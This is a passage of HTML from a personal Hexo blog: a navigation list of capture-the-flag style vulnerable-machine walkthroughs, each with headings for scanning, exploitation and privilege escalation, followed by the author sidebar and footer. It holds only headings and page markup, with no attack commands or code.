href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-31"><span class="nav-number">31.2.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-31"><span class="nav-number">31.3.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-31"><span class="nav-number">31.4.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#infosec_warrior03"><span class="nav-number">32.</span> <span class="nav-text"> Infosec_Warrior03</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E9%9D%B6%E6%9C%BAip-16"><span class="nav-number">32.1.</span> <span class="nav-text"> 寻找靶机IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-32"><span class="nav-number">32.2.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E8%B7%AF%E5%BE%84%E6%89%AB%E6%8F%8F-15"><span class="nav-number">32.3.</span> <span class="nav-text"> Web路径扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-32"><span class="nav-number">32.4.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-32"><span class="nav-number">32.5.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cengbox"><span class="nav-number">33.</span> <span class="nav-text"> CengBox</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E9%9D%B6%E6%9C%BAip-17"><span class="nav-number">33.1.</span> <span class="nav-text"> 寻找靶机IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-33"><span class="nav-number">33.2.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E8%B7%AF%E5%BE%84%E6%89%AB%E6%8F%8F-16"><span class="nav-number">33.3.</span> <span class="nav-text"> Web路径扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-33"><span class="nav-number">33.4.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-33"><span class="nav-number">33.5.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#tenderfoot-1"><span class="nav-number">34.</span> <span class="nav-text"> TenderFoot-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E9%9D%B6%E6%9C%BAip-18"><span class="nav-number">34.1.</span> <span class="nav-text"> 寻找靶机IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-34"><span class="nav-number">34.2.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E8%B7%AF%E5%BE%84%E6%89%AB%E6%8F%8F-17"><span class="nav-number">34.3.</span> <span class="nav-text"> Web路径扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-34"><span class="nav-number">34.4.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-34"><span class="nav-number">34.5.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#symfonos-2"><span class="nav-number">35.</span> <span class="nav-text"> symfonos 2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E9%9D%B6%E6%9C%BAip-19"><span class="nav-number">35.1.</span> <span class="nav-text"> 寻找靶机IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-35"><span class="nav-number">35.2.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E8%B7%AF%E5%BE%84%E6%89%AB%E6%8F%8F-18"><span class="nav-number">35.3.</span> <span class="nav-text"> Web路径扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-35"><span class="nav-number">35.4.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-35"><span class="nav-number">35.5.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fishymail"><span class="nav-number">36.</span> <span class="nav-text"> FishyMail</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E9%9D%B6%E6%9C%BAip-20"><span class="nav-number">36.1.</span> <span class="nav-text"> 寻找靶机IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-36"><span class="nav-number">36.2.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E8%B7%AF%E5%BE%84%E6%89%AB%E6%8F%8F-19"><span class="nav-number">36.3.</span> <span class="nav-text"> Web路径扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-36"><span class="nav-number">36.4.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-36"><span class="nav-number">36.5.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hemisphere-lynx"><span class="nav-number">37.</span> <span class="nav-text"> Hemisphere: Lynx</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E9%9D%B6%E6%9C%BAip-21"><span class="nav-number">37.1.</span> <span class="nav-text"> 寻找靶机IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-37"><span class="nav-number">37.2.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E8%B7%AF%E5%BE%84%E6%89%AB%E6%8F%8F-20"><span class="nav-number">37.3.</span> <span class="nav-text"> Web路径扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-37"><span class="nav-number">37.4.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-37"><span class="nav-number">37.5.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#colddbox-easy"><span class="nav-number">38.</span> <span class="nav-text"> ColddBox: Easy</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E9%9D%B6%E6%9C%BAip-22"><span class="nav-number">38.1.</span> <span class="nav-text"> 寻找靶机IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-38"><span class="nav-number">38.2.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E8%B7%AF%E5%BE%84%E6%89%AB%E6%8F%8F-21"><span class="nav-number">38.3.</span> <span class="nav-text"> Web路径扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-38"><span class="nav-number">38.4.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-38"><span class="nav-number">38.5.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">xXxYOLOxXx</p>
  <div class="site-description" itemprop="description">Explorer for unknown.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">52</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">51</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/monster414" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monster414" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:yolo-yolo@qq.com" title="E-Mail → mailto:yolo-yolo@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://music.163.com/#/user/home?id=302397927" title="CloudMisuc → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;302397927" rel="noopener" target="_blank"><i class=" fa-fw"></i>CloudMisuc</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://steamcommunity.com/id/Purple_Miracle/" title="Steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;id&#x2F;Purple_Miracle&#x2F;" rel="noopener" target="_blank"><i class=" fa-fw"></i>Steam</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://yoloyolo.top/atom.xml" title="RSS → https:&#x2F;&#x2F;yoloyolo.top&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">xXxYOLOxXx</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
